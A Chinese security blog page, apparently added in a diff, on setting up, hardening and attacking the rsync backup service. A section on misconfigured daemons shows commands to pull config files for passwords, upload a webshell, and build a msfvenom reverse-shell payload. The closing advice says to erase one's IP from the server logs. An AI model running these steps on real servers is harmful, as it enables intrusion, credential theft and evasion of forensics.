@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="服务安全 [ rsync ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>服务安全 [ rsync ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/07/05/rsync-sec/">
+                服务安全 [ rsync ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-07-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/env/">env</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>关于 Rsync<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">一款开源的,功能繁多的,同时支持对本地和远程进行全量或增量的备份工具,主要用于不同服务器间进行数据同步,默认使用增量备份</div></pre></td></tr></table></figure></p>
+<p>0x01 rsync 演示环境 [ Rsync服务端系统为 centOS6.8_x64 最小化安装 ]<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">rsync</span> 服务端:</div><div class="line"><span class="selector-tag">RsyncServer</span>	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.4</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">rsync</span> 客户端:</div><div class="line"><span class="selector-tag">RsyncClient26</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.7</span>	 <span class="selector-tag">Fedora</span> 26 <span class="selector-tag">x86_64</span></div><div class="line"><span class="selector-tag">RsyncClient14</span>	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.8</span>	 <span class="selector-tag">Ubuntu</span> 14<span class="selector-class">.04</span><span class="selector-class">.3</span> <span class="selector-tag">LTS</span> <span class="selector-tag">x86_64</span></div></pre></td></tr></table></figure>
+<p>0x02 对于 rsync 来讲,不管推还是拉,在此之前都会自动和之前的文件进行比对,只要有文件属性或者内容发生改变就重新备份,否则不会有任何动作,即<code>先比较后同步</code>,另外,rsync 默认同步时是不加密的,可使用 <code>ssh隧道</code> 的方式来进行加密同步<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">远程拷贝 [ 加密拷贝 ]: 相当于scp</div><div class="line"><span class="meta">#</span><span class="bash"> scp /root/pentest.txt root@192.168.5.4:/tmp/hacked.txt</span></div><div class="line"></div><div class="line">本地拷贝: 相当于cp</div><div class="line"><span class="meta">#</span><span class="bash"> cp -R /etc/ /webbak/</span></div><div class="line"></div><div class="line">删除文件: 相当于rm</div><div class="line"><span class="meta">#</span><span class="bash"> rm -fr /webbak/etc/</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>    
+<p>0x03 利用 <code>rsync + crontab</code> 的方式实现自动定时备份<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">主要用它来备份其它机器上的各种重要系统及服务配置文件,各类脚本代码,等……</div></pre></td></tr></table></figure></p>
+<p>0x04 利用 <code>rsync + sersync</code> 的方式自动进行实时备份<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">主要用它来备份用户上传上来的各类文件数据,因为涉及到用户传上来之后可能马上就要访问到该资源,所以要求必须进行实时备份才行</div></pre></td></tr></table></figure></p>
+<p>0x05 正常情况下,系统安装完以后默认就已经安装好了 rsync 工具,首先,在Rsync服务端和客户端上同时创建好各种用于备份的目录<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rpm -qa rsync</span></div><div class="line"><span class="meta">#</span><span class="bash"> rsync --version	此次演示使用的全部为3.x以上的版本</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir /webbak/&#123;file,sql,config,php,jsp,xml,pic,word,txt&#125; -p</span></div><div class="line"><span class="meta">#</span><span class="bash"> chown -R backuser.backuser /webbak/</span></div></pre></td></tr></table></figure></p>
+<p>0x06 rsync 客户端常用参数说明<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">a 归档模式,保持文件原有的各种属性信息</span></div><div class="line">-<span class="ruby">v 详细输出</span></div><div class="line">-<span class="ruby">z 传输时自动压缩提高传输速度</span></div><div class="line">-<span class="ruby">e 通过隧道同步</span></div><div class="line">-<span class="ruby">-exclude 排除某单个文件</span></div><div class="line">-<span class="ruby">-delete  把两个目录同步成一模一样,该参数慎用,会把原有的数据先清空再同步,如果有需求,要无差异同步,可以加上此选项</span></div></pre></td></tr></table></figure></p>
+<p>0x07 rsync 几种不同的工作模式</p>
+<p>最普通的<code>本地拷贝</code> 模式,rsync 本地同步<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rsync -avz /etc/hosts /webbak/config/ 		此时就相当于cp,只不过它在拷贝时会自动比对,如果文件没有任何属性变化,则不同步</span></div><div class="line"><span class="meta">#</span><span class="bash"> rsync -avz --delete /webbak/xml/ /webbak/config/ 	相当于把config目录中的内容换成跟xml目录中的一模一样,容易误操作,造成数据丢失</span></div></pre></td></tr></table></figure></p>
+<p>通过<code>ssh隧道</code>的方式进行同步,实际使用中建议用普通用户身份拷贝,只适合临时使用如下,我们先在Rsync客户端上创建一些等会儿用于备份的目录及文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd backuser</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"admin"</span> | passwd --stdin backuser</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /tmp/file&#123;1..15&#125;.txt</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir /tmp/dir&#123;1..15&#125;</span></div></pre></td></tr></table></figure></p>
+<p><code>推 [ push ]</code> 从本地到远端,如果加<code>--delete</code> 则会先把原有的删掉,然后重新同步,如果是目录要注意加上最后的斜线,否则会把目录本身也带上,加上了以后才表示目录下的子目录和文件<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avzP -e <span class="string">'ssh -p 22'</span> <span class="regexp">/tmp/</span> backuser@<span class="number">192.168</span>.<span class="number">5.4</span>:<span class="regexp">/webbak/</span>    在Ubuntu14上把本地指定的文件往RsyncServer上推</div></pre></td></tr></table></figure></p>
+<p><code>拉 [ pull ]</code> 从远端到本地,还是注意目录后面斜杠的问题,如果是拉去整个目录下的内容,记得在最后带上斜线<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avzP -e <span class="string">'ssh -p 22'</span> backuser@<span class="number">192.168</span>.<span class="number">5.4</span>:<span class="regexp">/webbak/</span> <span class="regexp">/webbak/</span> 在Fedora26上把RsyncServer上指定的文件往本地拉</div></pre></td></tr></table></figure></p>
+<p>通过<code>服务 [ daemon ]</code> 的方式进行同步:</p>
+<p><code>推 [ push ]</code> 从本地到远端<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avz /data/ rsync_backup@<span class="number">192.168</span><span class="number">.5</span><span class="number">.4</span>::webbak/ --password-file=/etc/rsync.password</div></pre></td></tr></table></figure></p>
+<p><code>拉 [pull]</code> 从远端到本地<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avz rsync_backup@<span class="number">192.168</span><span class="number">.5</span><span class="number">.4</span>::webbak/ /data/ --password-file=/etc/rsync.password</div></pre></td></tr></table></figure></p>
+<p>0x08 前面都是一些基于客户端的简易备份用法,现在开始真正配置rsync服务端<code>[ 其实就是 daemon 模式 ]</code>,配置文件默认是不存在的,需要自行手工创建<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd rsync -s /bin/nologin -M 	创建rsync服务用户,此用户不需要创建家目录,也不需要登陆到系统</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /etc/rsyncd.conf</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi /etc/rsyncd.conf</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">uid = rsync   			    当客户端连过来在当前系统中具备什么样的权限都是基于此用户</div><div class="line">gid = rsync 			    此处权限映射非常重要,生产环境中严禁以root身份来运行rsync服务,防止别人用来提权</div><div class="line">use chroot = no</div><div class="line">max connections = <span class="number">2000</span>   	    客户端最大并发连接数,也就说同时允许多少个客户端来连接,根据你实际的机器数量来</div><div class="line">timeout = <span class="number">600</span> 			    客户端连服务端超时时长,超过指定时长就自动断开</div><div class="line">pid file = /var/run/rsyncd.pid	    进程号文件</div><div class="line">lock file = /var/run/rsync.lock</div><div class="line">log file = /var/log/rsyncd.log      指定rsync 服务日志文件存放位置,出了问题,直接来这儿看</div><div class="line">ignore errors			    忽略错误</div><div class="line">read only = false		    必须同时允许可读写,要不然只能拉不能推</div><div class="line">list = false			    禁止客户端对服务端执行list操作,绝不能让客户端看到有什么,比较危险,一旦看到目录结构,肯定就会被人想办法利用</div><div class="line">hosts allow = <span class="number">192.168</span><span class="number">.5</span><span class="number">.0</span>/<span class="number">24</span>	    允许访问的网段或者ip,如果rsync直接暴露在公网,尤其要注意此项,也可利用iptables让其只能让指定内网访问</div><div class="line">host deny = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">32</span>		</div><div class="line">auth users = rsync_backup	    此用户为纯虚拟用户跟系统用户没有任何关系,如果不加此项,则表示允许匿名访问,大多数rsync安全问题都集中于此</div><div class="line">secrets file = /etc/rsync.password  存放密码的文件</div><div class="line"></div><div class="line">#####################################################################</div><div class="line">[webbak]				指定模块名,这里的模块可以同时有n个,这里只是为了演示效果所以就写了一个</div><div class="line">comment = RsyncServer by klion <span class="number">2017.7</span><span class="number">.5</span>	模块描述</div><div class="line">path = /webbak/				指定备份目录</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> man rsyncd.conf	查看rsync配置帮助</span></div><div class="line"><span class="meta">#</span><span class="bash"> rsync --daemon	启动rsync服务,默认端口873</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"rsync --daemon"</span> &gt;&gt; /etc/rc.local		加入自启动,可以自己写init.d脚本</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tunpl | grep rsync 或者 <span class="comment"># lsof -i :873</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> chown -R rsync /webbak/ 			 	需要让客户端能写,所以要改下备份目录属主</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"rsync_backup:admin"</span> &gt; /etc/rsync.password	创建虚拟账号密码,主要是希望备份的时候不要交互,方便后续写脚本</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /etc/rsync.password</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod 600 /etc/rsync.password &amp;&amp; ls -l /etc/rsync.password</span></div><div class="line"><span class="meta">#</span><span class="bash"> pkill rsync  想关闭rsync服务,直接杀进程即可</span></div></pre></td></tr></table></figure>
+<p>常用杀进程方式<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pkill   进程名 属于强力杀</span></div><div class="line"><span class="meta">#</span><span class="bash"> killall 进程名 属于平滑杀</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span> pid 	 加 -9 也属于强力杀</span></div></pre></td></tr></table></figure></p>
+<p>0x09 服务端确认没问题以后,我们再来配置 rsync 客户端,一般都是同内网中需要备份的所有机器 </p>
+<p><code>[ 记住如果是备份目录,后面务必加上&#39;/&#39;,否则它会把目录本身也带上,而我们只是想备份目标目录下的子目录和文件而已 ]</code>:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"admin"</span> &gt; /etc/rsync.password 				这里的密码务必要和服务端的密码对应上,只需要密码即可</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod	600 /etc/rsync.password &amp;&amp; ls -l /etc/rsync.password	修改并检查密码文件权限</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /etc/rsync.password</span></div></pre></td></tr></table></figure></p>
+<p>把 RsyncClient26 客户端的文件推到服务端<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avz <span class="regexp">/tmp/</span> rsync_backup@<span class="number">192.168</span>.<span class="number">5.4</span>::webbak --password-<span class="keyword">file</span>=<span class="regexp">/etc/</span>rsync.password</div></pre></td></tr></table></figure></p>
+<p>同步推的时候排除某单个文件或多个文件<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># rsync -avz --<span class="keyword">exclude</span>=file1.txt <span class="regexp">/tmp/</span> rsync_backup@<span class="number">192.168</span>.<span class="number">5.4</span>::webbak --password-<span class="keyword">file</span>=<span class="regexp">/etc/</span>rsync.password</div><div class="line"># rsync -avz --<span class="keyword">exclude</span>=&#123;file1.txt,file2.txt,file3.txt&#125; <span class="regexp">/tmp/</span> rsync_backup@<span class="number">192.168</span>.<span class="number">5.4</span>::webbak --password-<span class="keyword">file</span>=<span class="regexp">/etc/</span>rsync.password</div></pre></td></tr></table></figure></p>
+<p>在RsyncClient14上把服务端的文件拉到本地指定的目录中<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rsync -avz rsync_backup@<span class="number">192.168</span>.<span class="number">5.4</span>::webbak <span class="regexp">/webbak/</span> --password-<span class="keyword">file</span>=<span class="regexp">/etc/</span>rsync.password</div></pre></td></tr></table></figure></p>
+<p>0x10 rsync 基本安全优化:</p>
+<p>启动服务时,监听指定的ip和端口,一般只监听内网卡的ip,切记不要 <code>0.0.0.0</code>,默认端口一般都不会改,其实,对服务来讲,改端口作用并不大,服务扫描识别照样能探测出来,如果实在有业务需求需要把rsync直接暴露在公网上,可通过vpn内网或者ssh隧道的方式来搞<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># rsync --daemon --address=<span class="number">192.168</span><span class="number">.5</span><span class="number">.4</span> --port=<span class="number">873</span></div><div class="line"># netstat -tulnp</div></pre></td></tr></table></figure></p>
+<p>00x11 关于更多rsync故障问题,可参考日志进行分析:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="keyword">cat</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/rsyncd.<span class="keyword">log</span>  日志文件位置在前面Rsync服务端配置中我们已经定义好了</div></pre></td></tr></table></figure></p>
+<p>0x12 rsync 优缺点简述:</p>
+<p>优点<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">默认即增量同步,支持 socket<span class="string">[daemon]</span>,非常方便集中备份</div></pre></td></tr></table></figure></p>
+<p>缺点<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">同步大量小文件时,容易造成rsync进程挂掉,建议最好先集中打包压缩好再同步</div><div class="line">对于超大文件,中间容易中断,这里需要注意下,虽然同步中断了,但文件在rsync服务器上依然存在</div><div class="line">只不过是个还没传完整的隐藏文件,为了避免下次同步报错,同步之前务必先手工把那个'隐藏'文件先干掉</div></pre></td></tr></table></figure></p>
+<p>0x13 对每个客户端做计划任务实现定时备份:</p>
+<p>下面是经常需要备份的一些重要系统配置文件,其中也包括你自己写的各种脚本以及各类后端web脚本文件…:<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hosts|<span class="type">network</span>|<span class="type">resolv</span>.conf|<span class="type">ifcfg</span>-eth*|<span class="type">fstab</span>|<span class="type">passwd</span>|<span class="type">shadow</span>|<span class="type">gshaow</span>|<span class="type">gpasswd</span>|<span class="type">exports</span>|<span class="type">/var</span>/spool/cron/root....</div></pre></td></tr></table></figure></p>
+<p>0x14 在所有Rsync客户端上定时执行如下小脚本,即可实现定时备份,只是个小demo,如果要实际用,还需要好好完善下,注意,小文件务必先打包压缩好再推,以加快同步速度:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mkdir /opt/shdir</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /opt/shdir</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi bakup.sh</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">tmp_dir=<span class="string">"`/sbin/ifconfig | awk -F '[ :]+' 'NR==20 &#123;print <span class="variable">$4</span>&#125;'`_<span class="variable">$(date +%F-%T)</span>"</span> <span class="comment"># 取ip和时间,不同的发行版,awk截取的位置可能要稍微改下</span></div><div class="line">/bin/mkdir /bakdata/<span class="variable">$tmp_dir</span> -p &amp;&amp; \		  <span class="comment"># 创建临时目录,注意,下面是为了方便,才用的'|'把要备份的文件分开,实际在脚本里面要分开写</span></div><div class="line">/bin/cp /etc/&#123;hosts|passwd|shadow|exports|resolv.conf|fstab&#125; /bakdata/<span class="variable">$tmp_dir</span> &amp;&amp; \</div><div class="line">/usr/bin/rsync -az /bakdata/<span class="variable">$tmp_dir</span>.tar.gz rsync_backup@192.168.5.4::webbak --password-file=/etc/rsync.password</div></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tmp_dir=<span class="string">"`ifconfig | awk -F '[ :]+' 'NR==20 &#123;print $4&#125;'`_$(date +%F-%T)"</span> ubuntu14上的写法</div><div class="line">tmp_dir=<span class="string">"`ifconfig | awk -F '[ :]+' 'NR==20 &#123;print $3&#125;'`_$(date +%F-%T)"</span> fedora26上的写法</div></pre></td></tr></table></figure>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># crontab -e</span></div><div class="line">  <span class="number">00</span> <span class="number">01</span> * * * <span class="meta-keyword">/bin/</span>sh <span class="meta-keyword">/opt/</span>shdir/bakup.sh &gt;<span class="meta-keyword">/dev/</span>null <span class="number">2</span>&gt;<span class="variable">&amp;1</span>  <span class="meta"># 每天晚上12点自动备份</span></div></pre></td></tr></table></figure>
+<p>0x15 如何利用 Rsync 的各种错误配置</p>
+<p>下面是一些常见的rsync错误配置,<code>以root身份来运行rsync,可读写,且允许匿名访问</code><br><img src="/img/rsync error.png" alt=""></p>
+<p>尝试把各类敏感配置文件拉到本地,为后续进一步渗透搜集必要信息,其实实战中这个危害还是蛮大的,很多时候就是这样搞到了密码<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># rsync <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::</div><div class="line"># rsync <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::webbak/</div><div class="line"># rsync <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::webbak/config/</div><div class="line"># rsync -avz <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::webbak/config/config.inc.php /root/config.php</div></pre></td></tr></table></figure></p>
+<p><img src="/img/rsync webbak.png" alt=""><br><img src="/img/rsync webbak download.png" alt=""></p>
+<p>把本地的webshell推到目标的备份站点目录中,不过,一般即使上传webshell也没什么用,因为备份服务器的东西,在没出特别大的问题时基本都不会用备份,也就是说,你的webshell可能根本到不了真正的web服务网站目录里,后端脚本自然没法运行,除非目标的rsync服务和web服务在同一台机器上,可能性稍微还大点,另外,细心的朋友可能也发现了,这里的<code>hacked.php</code>脚本是没有执行权限的,大家可以在本地赋予好完全权限,然后再往目标上保持原文件属性同步<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># rsync shell.php <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::webbak/web-data/hacked.php</div><div class="line"># rsync <span class="number">192.168</span><span class="number">.3</span><span class="number">.35</span>::webbak/web-data/</div></pre></td></tr></table></figure></p>
+<p><img src="/img/rsync webbak upload.png" alt=""></p>
+<p>利用rsync服务尝试本地提权,实战中基本也不会碰到这种情况,起码到现在为止,自己从来都没遇到过,运气好也说不定,因为服务本身是以root权限起的,所以利用很简单,可以在本地推上去一个带有suid的payload,注意一定要保持文件的原有属性推,当我们在webshell或者菜刀中执行该payload时,正常情况下就会弹回一个root权限的meterpreter,不过,自己实际测试中,多次尝试并未达到预期效果,原因还在查找中,另外,在msf中也早已提供好了对应的利用模块,大家可自行尝试<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.38 LPORT=443 -f elf -o rsyncshell</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll rsyncshell</span></div><div class="line"><span class="meta">#</span><span class="bash"> rsync -avz /root/rsyncshell 192.168.3.35::webbak/web/</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./rsyncshell</span></div></pre></td></tr></table></figure></p>
+<p>0x16 rsync 简单加固<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">务必以较低的系统用户权限来运行rsync服务,一般都是系统伪用户</div><div class="line">严格限制外部<span class="built_in">ip</span>访问,一般只允许指定的内网<span class="built_in">ip</span>进行访问</div><div class="line">如果有公网备份需求,可利用iptables严格进行来源限制,如果可能的话最好用vpn内网或者ssh隧道来进行</div><div class="line">开启用户认证,严禁被匿名访问</div></pre></td></tr></table></figure></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实说白点,只要不是白痴,想配错基本是非常困难的,都是再基础不过的服务了,非常简单,这里不多啰嗦了,多提醒一句,走的时候记得把rsync服务端日志中,自己ip的同步记录全部干掉,避免一些不必要的麻烦</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/演练环境搭建/">#演练环境搭建</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
